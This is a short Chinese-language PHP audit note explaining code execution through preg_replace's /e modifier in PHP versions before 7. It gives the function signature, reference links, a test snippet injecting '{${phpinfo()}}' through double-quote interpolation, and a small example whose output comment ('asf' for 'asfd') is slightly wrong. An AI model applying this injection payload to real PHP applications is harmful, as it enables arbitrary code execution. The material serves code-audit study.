# preg_replace


**利用条件：**
- PHP<7

**参考文章：**
- https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day8/files/README.md
- https://xz.aliyun.com/t/2557
- https://www.cnblogs.com/dhsx/p/4991983.html

**函数结构：**
```
preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] ) : mixed
```

## 利用

$pattern 存在`/e`模式修正符，允许代码执行。

**测试代码：**
```php
<?php
var_dump(preg_replace('/(.*)/ie','strtolower("\1")','{${phpinfo()}}'));
?>
```

以上代码能执行除了`preg_replace`的`/e`修饰符可以执行代码外，还一个原因是strtolower函数使用了`""`。我们知道`""`内部是可以引用变量的。如：
```php
<?php
$a='asfd';
echo "$a";  #asf
```
